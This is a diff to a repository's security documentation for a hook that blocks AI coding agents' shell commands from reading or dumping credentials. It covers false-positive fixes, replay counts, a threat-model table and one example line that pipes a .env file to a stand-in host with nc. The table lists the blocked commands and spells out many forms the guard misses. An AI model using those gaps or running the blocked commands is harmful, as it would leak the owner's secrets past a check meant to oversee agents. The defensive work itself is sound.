@@ -451,7 +451,10 @@ Live broker keys are out of scope for this repository. Live trading is handled o
 
 ## Picking up in a new session
 
-Put the file paths, never the values, in your shell startup file once:
+Put the file paths, never the values, in your shell startup file once (a non-interactive shell, such as a Claude Code
+Bash tool shell, reads none of it; see
+[Pointers in non-interactive shells](#false-positive-repair-and-reserved-words-2026-10-12) for the setting that gives
+Claude Code sessions the same pointers):
 
 ```sh
 # ~/.bashrc or ~/.zshrc: pointers only; no credential value is exported
@@ -1175,7 +1178,8 @@ text heuristic, not a shell parser; the recorded limits below apply subject to t
   (`< .env nc example.invalid 80` is a `dotenv_read`), and `cat < ~/.aws/credentials` keeps its verdict.
   A backquote inside a single-quoted string is text for the shell that string is handed to, so
   `bash -c 'echo "`printenv`"'` and `eval '...'` read it (the tokenizer used to turn every backquote into `;`).
-- **K3 here-document history; K4 exempts only form F below.** Outside that exact top-level Python/Node form,
+- **K3 here-document history; K4 exempts only form F below, and L2 (2026-10-12) the bodies of
+  [False-positive repair and reserved words](#false-positive-repair-and-reserved-words-2026-10-12).** Outside those forms,
   a here-document's lines retain both base shell readings. Data/prose bodies and rejected F forms remain command lines,
   and a
   `"$(...)"` or a backquote pair in a body line is read as a substitution: `cat <<'EOF' > note.md` followed by
@@ -1450,7 +1454,7 @@ and `busctl --user get-property org.freedesktop.systemd1 /org/freedesktop/system
 Environment`, and a substitution nested beyond 32 levels or past the work budget (shlex's quote parity happens to expose
 the innermost command of `"$(echo "$(...)")"` one level down, so the tests count the texts read instead). The other
 way, the guard reads as commands what is not one: an array literal `x=(env -i A=b)`, a Python `set(...)` in a
-here-document outside K4 form F, prose in a data here-document that looks like a command, and an `E`
+here-document outside K4 form F and L2, prose in a data here-document that looks like a command, and an `E`
 after `ps -C` that is a command name (`ps -CEmacs`).
 
 ### K4: runner commands and bounded interpreter reading (2026-09-30)
@@ -1782,6 +1786,109 @@ URL occurrence revisits every consumer.
 The hook is not a security boundary, does not inspect arbitrary script files or
 MCP tool calls and never reads credentials or contacts a gateway while checking.
 
+### False-positive repair and reserved words (2026-10-12)
+
+**Ruling.** The command center's ruling of 2026-10-12 (17:19Z), on the owner's question whether the environment guard
+should go because of its friction: keep it, since it keeps key values out of transcripts, which feed records and pull
+request bodies, and remove its false positives. Allow a presence check of a pointer variable named in the inventory
+(never its value), flag a here-document only when its code reads and prints environment values, and keep every block
+on key values, store paths in commands and real dumps. Its approval of 18:34Z folded in a gap found while sizing the
+false positives (segments that begin with a bash reserved word; the shapes are in the api-actions lane's private
+record `readers/guard-fp-20261012/FINDING-reserved-word-segments.md`), on the condition that a replay of the recorded
+commands shows the false positives falling and no new refusal of a command that is not a true positive.
+
+**What changes.** Each item below is in `scripts/hooks/secret_path_guard.py` and in
+`GuardFalsePositiveRepairTests` of `tests/test_secret_path_guard.py`, whose rows fail on the guard at `2f59d744`
+(42 failures and one error) and pass here.
+
+- **L2: more masked bodies** (`k4_code_bodies`). Besides form F, a here-document body leaves both base word readings
+  when all of these hold. Its delimiter word is one quoted identifier and its operator is `<<`, not `<<-`. Bash reads
+  the operator outside every quote, comment and substitution and resumes at top level after the body
+  (`k4_resume_contexts` gives the empty context). Its operator line is one physical line, not continued, with exactly
+  one `<<`. After the line's last `;`, `&&` or `||`, and past leading reserved words, assignments with a plain value
+  and `timeout DURATION` (which runs the command on the same standard input), the command is an F operator line or
+  exactly `cat > FILE` or `cat >> FILE` writing a `.py`, `.js`, `.mjs` or `.cjs` file. Output redirections that stand
+  before `<<` are read after it, since they touch descriptors 1 and 2 only (Bash Reference Manual, "Redirections").
+  A later line equals the delimiter. The operator line, the terminator line and all text after the terminator stay
+  in both readings, and TAIL-READ reads each text after a terminator without the masked bodies inside it. The CODE
+  rules read every masked interpreter body as its language's code. The whole-text rules, the keyring-code rule and
+  the after-source checks (`environment_dump_after_source`, `trace_while_sourcing`) still read the whole text,
+  bodies included, so no after-source verdict changes. A written code file's body is read neither as shell nor as
+  code: this command does not run it as written, and the guard reads no script file, whether a here-document or the
+  Write tool wrote it. Every other here-document keeps both base readings: an unquoted delimiter, an interpreter named
+  by a variable, any other launcher, a pipe program outside F's filters, a shell script, a data or prose file, or a
+  name only a variable holds. The ruling's sentence is about code: a prose body with a line that reads as a dump stays
+  refused under the K3 record (`test_blocked_commands`), and the one such command in the replay window is among the
+  residuals below. A file named as Python or JavaScript that a `cat` writes and a shell then runs in the same command
+  is a recorded residual (`EXPECTED_PASS_THROUGH`).
+- **L3: literals read as bash reads them** (SHELL-LITERAL). In a literal read as shell text, a `(` that touches a word
+  character before it is read as a blank (`K4_CALL_PARENTHESIS`): bash runs nothing from `name(`, which can only begin
+  a function definition `name ()` and is otherwise a syntax error, so `sorted(set(m))` in Python source no longer
+  yields a `set` segment, while `(set)`, `$(...)` and `<(...)` keep theirs. A literal that is the only argument of a
+  data method (`d.get("env")`, `line.startswith("export ")`; `K4_DATA_METHODS`, from the str, bytes, dict, list, set
+  and re methods of the Python Library Reference and the String, Array, Map, Set and RegExp methods of ECMA-262) is a
+  key or an affix, not a standalone command. Every recognized shell-out call is still read by SHELL-OUT, and a call
+  through any other name stays standalone. RESERVED (below) stays off inside a literal's reading, since Python's and
+  JavaScript's `if`, `else`, `while` and `do` would read as bash's.
+- **Pointer presence check** (`printenv_presence_check`): `printenv` with one or more inventory pointer names, no
+  option, and standard output's last redirection on `/dev/null` (`>/dev/null`, `&>/dev/null`, `>& /dev/null`,
+  also followed by `2>&1`) answers by its exit status only. `printenv NAME` alone, a pipe, `>/dev/null 1>&2`, a
+  separated `1 >/dev/null`, an option, a non-pointer name or a name a variable holds still refuse. `[[ -v NAME ]]`
+  and `test -n "${NAME+x}"` passed before and still pass; the `environment_dump` hint now names both forms.
+- **Help and version**: `env` or `printenv` with `--help` or `--version` as the only argument prints usage or a
+  version line and exits (GNU coreutils manual, "Common options"; measured on this host's uutils 0.10.0 on
+  2026-10-12T18:52Z: a synthetic marker variable is absent from every help and version output of both programs and
+  present in bare `env`'s). The prior reading's bare `env` segment for such a command is no longer added.
+- **RESERVED** (tier k, `k4_reserved_reason`): a segment of either reading that begins with `!`, `{`, `if`, `then`,
+  `elif`, `else`, `while`, `until`, `do` or `coproc` is read again as the command after those words, through
+  `k4_derived` and every rule. Before, no segment rule read that command. It only refuses. `case` patterns,
+  `coproc NAME { ... }` and `function NAME { ... }` are not read this way.
+
+**Replay.** The landing condition's measurement: every Bash call in this host's Claude Code transcripts, subagents
+included, timestamped from 2026-10-11T00:00Z to 2026-10-13T00:00Z, extracted 2026-10-12T18:36Z: 55,469 calls, 54,207
+distinct commands, each read by `check()` of the guard at `2f59d744` and of this change, with the hook's size limit.
+
+| Class | Main | This change |
+| --- | ---: | ---: |
+| `environment_dump` | 262 | 34 |
+| `dotenv_read` | 24 | 24 |
+| `interpreter_environment_unclassified` | 17 | 18 |
+| `secret_name_search` | 14 | 14 |
+| `environment_dump_after_source` | 13 | 13 |
+| `credential_run_usage` | 5 | 5 |
+| `service_manager_environment` | 5 | 5 |
+| `credential_store_path` | 4 | 4 |
+| `process_environment` | 4 | 4 |
+| `secret_variable_reference` | 3 | 2 |
+| six other classes (one or two each) | 8 | 8 |
+| **All refusals** | **359** | **131** |
+
+No command that main allowed is refused. 228 commands main refused now pass: 218 here-document bodies (the `set`,
+`env` and `export` words of Python and JavaScript code read as shell commands), 9 `env --help` or `--version`
+calls, and one Python string literal naming the key runner's usage, with no invocation. One refusal changes reason,
+from `environment_dump` to `interpreter_environment_unclassified`. No command in the window was a literal pointer
+presence check; its two pointer checks name the pointer through a loop variable (`printenv $v`), which still
+refuses. The 34 remaining `environment_dump` refusals: 15 `env` piped into a filter (the guard does not judge
+filters), 13 here-documents outside L2 and L3 (three interpreters named by a variable, two unquoted delimiters, two
+pipe filters outside F's list, two written shell or prose files, two literal shapes, one interpreter heredoc inside
+a `-c` string and one standalone `env` literal), two such loop checks, one `printenv` of a variable that is not a
+pointer, one `env -i` with assignments only, and two inline programs that print the environment. The commands
+themselves stay with the lane's private records, since they hold command text.
+
+**Pointers in non-interactive shells.** Measured on 2026-10-12: this host's `~/.bashrc` exports the pointers after
+its interactive guard, and a Claude Code 2.1.296 Bash tool shell is neither interactive nor a login shell (`$-` is
+`hmtBc`; `shopt login_shell` is off), so `PAPER_ENV_FILE` is unset there while `bash -ic` sees it. Bash reads no
+startup file for such a shell except the one `BASH_ENV` names (bash(1), "INVOCATION"). The mechanism this record
+chooses is Claude Code's user-scope `env` object in `~/.claude/settings.json`, which sets variables "for every session
+and for the subprocesses Claude Code starts from it" ([settings reference](https://code.claude.com/docs/en/settings-reference.md),
+`env`, read 2026-10-12T19:05Z, sha256 `4bec5505c7f33da3284848047b7e0c90148d777daf90b4cfda9da0a64878de08`). The
+operator adds each pointer of the block in [Picking up in a new session](#picking-up-in-a-new-session) there, as an
+absolute path. Pointers are paths, never values, and the profile installer's `env` handling is for MCP servers only,
+so a reinstall leaves the object alone. Agents edit neither settings nor startup files. A SessionStart hook that
+appends the exports to `CLAUDE_ENV_FILE` ([hooks](https://code.claude.com/docs/en/hooks.md), "Persist environment
+variables", read 2026-10-12T19:05Z, sha256 `31754d5adce5052af35acf85dc2ed207bb082b7dbf87f25218047b10a024a073`) also
+works; it was not chosen because it adds a hook to install for values that never change on a host.
+
 ## Threat model and what each guard stops
 
 | Layer | Stops | Does not stop |
@@ -1790,7 +1897,7 @@ MCP tool calls and never reads credentials or contacts a gateway while checking.
 | `scripts/git-hooks/pre-commit` (gitleaks on staged changes) | known secret shapes in a commit, before it is made | `--no-verify`; clones where `core.hooksPath` is not set; values with no recognizable shape |
 | CI gitleaks (`validate.yml`), GitHub secret scanning and push protection (public repo) | pushes and history that contain known provider patterns | anything not yet pushed; custom formats. This layer only reacts after the fact |
 | Project `.claude/settings.json` deny rules | Claude's Read/Edit tools on the listed paths (including both Hugging Face token files at their default location, and since 2026-09-27 the [home and tool credential stores](#home-and-tool-credential-stores-2026-09-27)); `printenv`, `env`, `gh auth token`, `hf auth token`, `git credential fill`, `gh auth git-credential`; through the `**/` twins, Context Mode's `ctx_execute_file` and `ctx_index` on the same paths | Python or other subprocesses that open the files themselves, including code run by Context Mode's `ctx_execute` or `ctx_batch_execute` that opens a file directly; forms that do not match the rule text; a moved `HF_HOME`; sessions started outside this repository |
-| `scripts/hooks/secret_path_guard.py` (PreToolUse, Bash; project settings and, through the profile installer, user settings) | commands that name a store path (the Hugging Face token files also as `$HF_HOME/...` or `$XDG_CACHE_HOME/huggingface/...`); read or copy the whole Hugging Face home; read `/proc/*/environ` in any spelling; dump the environment; reference a secret variable; trace a process; print a native token (`gh auth token`, `hf auth token`, `huggingface-cli ... token`, `--show-token`, and the credential-helper forms `git credential fill`, `git credential-<helper> get`, `gh auth git-credential` that `gh auth setup-git` enables); run a reader (`cat`, `sed`, `awk`, `jq`, ...), copy (`cp`, `scp`, `rsync`) or search (`grep`, `rg`, `ag`, `ack`, `git grep`, `find -exec` with a reader) on a pointer variable such as `$HF_TOKEN_PATH`, a `.env`/`*.env` file, a secret variable **name**, or any path the template's credential-store `Read` denies cover: anything in `~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.azure`, `~/.kube`, an OmniRoute data directory, a `shell_snapshots` directory or the OpenHands runtime-worker `runtime-workers/openhands/secrets` directory, each directory and a glob in it, the Docker home, the Docker, git-credential, netrc, npm and PyPI files, and `nativestack/*.key` ([2026-09-27](#home-and-tool-credential-stores-2026-09-27), which on an RTK host is what stops `cat` of them); redirect a pointer variable such as `$HF_TOKEN_PATH` into a command (`<`, `<<<`, `<>`); turn on shell tracing or verbose mode (`bash -x`, `sh -x`, `set -x`, `set -v`, `set -o xtrace`) in a command that sources a credential file; dump the environment (`env`, `printenv`, `export -p`, `declare -p/-x`, inline `os.environ`) after sourcing one; for the kernel keyring ([Guard coverage](#guard-coverage-2026-09-26)), read a payload (`keyctl print`, `pipe`, `read`, `dh_compute`, every direct `list` or `rlist` invocation regardless of target, or a keyring payload read in inline interpreter code), print part of the Tavily key (`tvly auth` without `--json`), or give `kernel_keyring.py exec` or `tvly-keyring` a command that breaks any rule above, names the injected variable or dumps the environment it inherits, also behind a launcher; each text rule also reads the command after quote removal, and every rule reads the command an `rtk` invocation runs ([2026-09-27](#home-and-tool-credential-stores-2026-09-27)) or a `systemd-run` starts, and so does the body of a command substitution inside double quotes (`echo "$(printenv)"`), and `ps -E` or a dashless `ps` cluster with a capital `E` is an environment dump like `ps e`, and so is `systemctl show-environment`, a service manager's whole environment block; a secret variable set through `systemd-run`'s `-E`, `--setenv` or `-p Environment=` is blocked ([2026-09-29](#launchers-substitutions-and-manager-environments-2026-09-29)); K4 also inspects credential-runner starts, applies the exact local gateway HTTP matrix and CLI refusal, blocks manager secret imports/writes and literal keyring-store feeds, checks explicit ps selectors and canary terminal triggers, protects both added Claude secret names and complete OmniRoute data trees, and reads interpreter whole-environment output/unknown access plus literal shell-outs in here-document regions ([K4](#k4-runner-commands-and-bounded-interpreter-reading-2026-09-30)) | only exact top-level form F replaces both base body-as-shell readings; rejected forms and data bodies retain B, inline code receives WHOLE-ENV but no new shell-out reading, and this remains accident prevention rather than a security boundary; any Context Mode `ctx_*` call (an MCP tool: the hook is registered for `Bash`, and the guard passes every other tool), a program that imports a loader and prints the result (including `huggingface_hub.get_token()`), an inline interpreter that opens `$HF_TOKEN_PATH` itself (for example `python3 -c "...open(os.environ['HF_TOKEN_PATH'])..."`, which never spells a literal `$HF_TOKEN_PATH`), an archiver such as `tar` on the Hugging Face home, a recursive read or copy of an ancestor directory (`~`, `$HOME`, `~/.cache`, or `$XDG_CACHE_HOME` with a trailing `/` or `/*`) that reaches the Hugging Face home without naming it, a relative read after `cd` into the Hugging Face home, `$HF_HOME/.`, the credential-store gaps recorded under [2026-09-27](#home-and-tool-credential-stores-2026-09-27) (an archiver, a copy or search of `~/.config`, `~/.codex`, `~/.claude` or the runtime-worker state directory, a client that prints its own store, an OmniRoute `DATA_DIR` elsewhere, and `docker exec` into the OpenHands agent-server or a full `docker inspect` of it, which show its session key), obfuscated or renamed paths, a script file that sources and traces on its own, a shell or interpreter started by `exec` that reads its commands from a pipe or a script file, a renamed copy of `kernel_keyring.py`, a variable name assembled at run time, a launcher that takes its command as one string (`script -c`), the macOS `secret run NAME -- command` form, and anything else that is not literal text in the command |
+| `scripts/hooks/secret_path_guard.py` (PreToolUse, Bash; project settings and, through the profile installer, user settings) | commands that name a store path (the Hugging Face token files also as `$HF_HOME/...` or `$XDG_CACHE_HOME/huggingface/...`); read or copy the whole Hugging Face home; read `/proc/*/environ` in any spelling; dump the environment; reference a secret variable; trace a process; print a native token (`gh auth token`, `hf auth token`, `huggingface-cli ... token`, `--show-token`, and the credential-helper forms `git credential fill`, `git credential-<helper> get`, `gh auth git-credential` that `gh auth setup-git` enables); run a reader (`cat`, `sed`, `awk`, `jq`, ...), copy (`cp`, `scp`, `rsync`) or search (`grep`, `rg`, `ag`, `ack`, `git grep`, `find -exec` with a reader) on a pointer variable such as `$HF_TOKEN_PATH`, a `.env`/`*.env` file, a secret variable **name**, or any path the template's credential-store `Read` denies cover: anything in `~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.azure`, `~/.kube`, an OmniRoute data directory, a `shell_snapshots` directory or the OpenHands runtime-worker `runtime-workers/openhands/secrets` directory, each directory and a glob in it, the Docker home, the Docker, git-credential, netrc, npm and PyPI files, and `nativestack/*.key` ([2026-09-27](#home-and-tool-credential-stores-2026-09-27), which on an RTK host is what stops `cat` of them); redirect a pointer variable such as `$HF_TOKEN_PATH` into a command (`<`, `<<<`, `<>`); turn on shell tracing or verbose mode (`bash -x`, `sh -x`, `set -x`, `set -v`, `set -o xtrace`) in a command that sources a credential file; dump the environment (`env`, `printenv`, `export -p`, `declare -p/-x`, inline `os.environ`) after sourcing one; for the kernel keyring ([Guard coverage](#guard-coverage-2026-09-26)), read a payload (`keyctl print`, `pipe`, `read`, `dh_compute`, every direct `list` or `rlist` invocation regardless of target, or a keyring payload read in inline interpreter code), print part of the Tavily key (`tvly auth` without `--json`), or give `kernel_keyring.py exec` or `tvly-keyring` a command that breaks any rule above, names the injected variable or dumps the environment it inherits, also behind a launcher; each text rule also reads the command after quote removal, and every rule reads the command an `rtk` invocation runs ([2026-09-27](#home-and-tool-credential-stores-2026-09-27)) or a `systemd-run` starts, and so does the body of a command substitution inside double quotes (`echo "$(printenv)"`), and `ps -E` or a dashless `ps` cluster with a capital `E` is an environment dump like `ps e`, and so is `systemctl show-environment`, a service manager's whole environment block; a secret variable set through `systemd-run`'s `-E`, `--setenv` or `-p Environment=` is blocked ([2026-09-29](#launchers-substitutions-and-manager-environments-2026-09-29)); K4 also inspects credential-runner starts, applies the exact local gateway HTTP matrix and CLI refusal, blocks manager secret imports/writes and literal keyring-store feeds, checks explicit ps selectors and canary terminal triggers, protects both added Claude secret names and complete OmniRoute data trees, and reads interpreter whole-environment output/unknown access plus literal shell-outs in here-document regions ([K4](#k4-runner-commands-and-bounded-interpreter-reading-2026-09-30)) | form F and the L2 bodies of 2026-10-12 (interpreter here-documents behind a prefix or before trailing text, and Python or JavaScript files a `cat` writes) replace both base body-as-shell readings; other forms and data bodies retain B, inline code receives WHOLE-ENV but no new shell-out reading, and this remains accident prevention rather than a security boundary; any Context Mode `ctx_*` call (an MCP tool: the hook is registered for `Bash`, and the guard passes every other tool), a program that imports a loader and prints the result (including `huggingface_hub.get_token()`), an inline interpreter that opens `$HF_TOKEN_PATH` itself (for example `python3 -c "...open(os.environ['HF_TOKEN_PATH'])..."`, which never spells a literal `$HF_TOKEN_PATH`), an archiver such as `tar` on the Hugging Face home, a recursive read or copy of an ancestor directory (`~`, `$HOME`, `~/.cache`, or `$XDG_CACHE_HOME` with a trailing `/` or `/*`) that reaches the Hugging Face home without naming it, a relative read after `cd` into the Hugging Face home, `$HF_HOME/.`, the credential-store gaps recorded under [2026-09-27](#home-and-tool-credential-stores-2026-09-27) (an archiver, a copy or search of `~/.config`, `~/.codex`, `~/.claude` or the runtime-worker state directory, a client that prints its own store, an OmniRoute `DATA_DIR` elsewhere, and `docker exec` into the OpenHands agent-server or a full `docker inspect` of it, which show its session key), obfuscated or renamed paths, a script file that sources and traces on its own, a shell or interpreter started by `exec` that reads its commands from a pipe or a script file, a renamed copy of `kernel_keyring.py`, a variable name assembled at run time, a launcher that takes its command as one string (`script -c`), the macOS `secret run NAME -- command` form, and anything else that is not literal text in the command |
 | Codex `[shell_environment_policy] inherit = "none"` | credential and broker variables in the launcher environment reaching Codex shells (measured, see below) | file reads. The setting controls which environment variables a Codex shell inherits, not which files it can open. A Codex shell can still `cat` a store file. The file-level mitigations are the store's location outside every workspace and the Codex sandbox; Codex 0.155.1 has no documented per-path read deny |
 
 In plain terms: an agent running as your user in `bypassPermissions` mode can
